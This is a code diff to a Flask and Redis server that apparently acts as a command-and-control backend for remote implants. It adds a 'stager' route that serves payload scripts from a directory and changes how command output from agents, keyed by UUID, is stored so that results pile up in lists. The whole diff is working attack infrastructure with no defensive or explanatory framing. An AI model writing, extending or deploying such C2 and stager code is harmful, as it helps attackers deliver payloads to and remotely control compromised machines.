@@ -1,4 +1,4 @@
-from flask import Flask, request, Response, jsonify
+from flask import Flask, request, Response, jsonify, send_from_directory
 import redis
 from functions import *
 import os
@@ -14,6 +14,10 @@ if not os.path.exists(db_path):
 r = redis.Redis(host=os.getenv('REDIS_HOST'), port=6379, db=0, decode_responses=True)
 
 app = Flask(__name__)
+
+@app.route('/<string:script>', methods=['GET'])
+def stager(script):
+    return send_from_directory('scripts', script, as_attachment=False)
 
 @app.route('/admin', methods=['POST'])
 def send_command():
@@ -52,7 +56,7 @@ def commander():
         data = request.data
         if uuid and data:
             key = f"{uuid}-output"
-            r.set(key, data)
+            r.rpush(key, data)
         return "Success"
     else:
         return "Invalid Method"
